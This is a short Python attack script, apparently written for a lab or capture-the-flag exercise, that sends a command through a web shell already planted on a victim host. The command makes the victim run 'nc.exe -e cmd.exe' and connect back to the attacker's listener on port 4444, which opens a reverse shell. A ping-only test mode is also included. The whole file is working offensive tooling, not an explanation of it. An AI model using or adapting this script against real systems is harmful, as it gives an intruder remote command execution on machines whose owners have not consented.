# this script causes the victim to execute nc.exe to connect to our listener so we can send commands to them
import urllib.parse
from webshellrepl import ensure_webshell

###################################
# options
attacker_ip='10.10.14.175'
victim_ip='10.129.7.134'
PING_ONLY=False #just ping? simpler. you should use wireshark to debug.

payload = f"nc.exe -e cmd.exe {attacker_ip} 4444"

## other payload testing
# payload = "whoami"

# end of options
###################################


# make sure webshell exists
ensure_webshell(victim_ip)

# nc.exe%20-e%20cmd.exe%20<TUN_IP>%204444"
if PING_ONLY:
    print("WARN: We are just pinging the victim.")
    payload = f"ping {victim_ip} -n 4"

# url encode payload for http get body
payload = urllib.parse.quote(payload)

# build url with payload
url = f"http://{victim_ip}:8808/webshell.php?cmd={payload}"
print(url)

# send payload and trigger rev shell
import requests
from pprint import pprint
reply = requests.get(url)
pprint(reply)
if(reply.status_code>=400):
    print("error. webshell likely doesn't exist, go upload it again.")
print(reply.text)
